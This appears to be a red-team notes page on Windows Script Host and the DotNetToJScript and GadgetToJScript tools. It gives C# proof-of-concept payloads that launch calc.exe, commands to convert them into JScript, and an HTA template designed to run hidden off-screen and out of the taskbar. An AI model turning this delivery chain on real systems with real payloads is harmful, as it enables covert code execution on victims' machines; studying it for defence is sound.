# ⭕ JScript

## <mark style="color:red;">WSH</mark>

VBScript and Jscript are executed by the windows script host. they run by the windows scripting host (WSH). they run as a console application (cscript.exe) or a GUI app (wscript.exe). the engines are not implemented in wscript.exe or cscript.exe. but in vbscript.dll and jscript.dll. these are both activeX DLLs which contain activeX objects.

## <mark style="color:red;">DotNetToJScript</mark>

#### References

* [Github repo](https://github.com/tyranid/DotNetToJScript)
* [WhiteOakSecurity](https://www.whiteoaksecurity.com/blog/2020-1-16-advanced-ttps-dotnettojscript-part-1/)

Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type:

```
#Sample DLL
#csc.exe /target:library thisfile.cs -o sample.dll

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Prog
{
public class Popme
{
  public void Box()
  {
    Process.Start("calc.exe");
    System.Windows.Forms.MessageBox.Show("Hello");
  }
}
}
```

#### Compile

```
#Test
DotNetToJScript.exe  -l JScript -o test.js -c <namespace. eg: Popme> sample.dll
Wscript.exe test.js

#For HTA
DotNetToJScript.exe  -l JScript -o output.txt -c <Classname. eg: Popme> sample.dll
#Append : o.<Method Name>();
```

#### Create HTA

```
<html>
<head>
<script language="JScript">
window.moveTo(-1337, -2019);
window.blur();
window.resizeTo(2, 4);

<!!! Add Script Here !!!>
</script>
<hta:application caption="no" windowState="minimize" showInTaskBar="no"
                 scroll="no" navigable="no" />
                 <!--  -->
</head>
<body>
</body>
</html>
```

## <mark style="color:red;">GadgetToJScript</mark>

* [Github Repo](https://githubmemory.com/repo/rasta-mouse/GadgetToJScript)

```
#Create a constructor. Save as source.cs

using System;
using System.Diagnostics;

public class Same
 { 
  public Same()
   {
    Process.Start("calc.exe");
   }
 }
```

```
GadgetToJScript.exe -i source.cs -w js -r <Reference assembly> -o out.txt -f
```
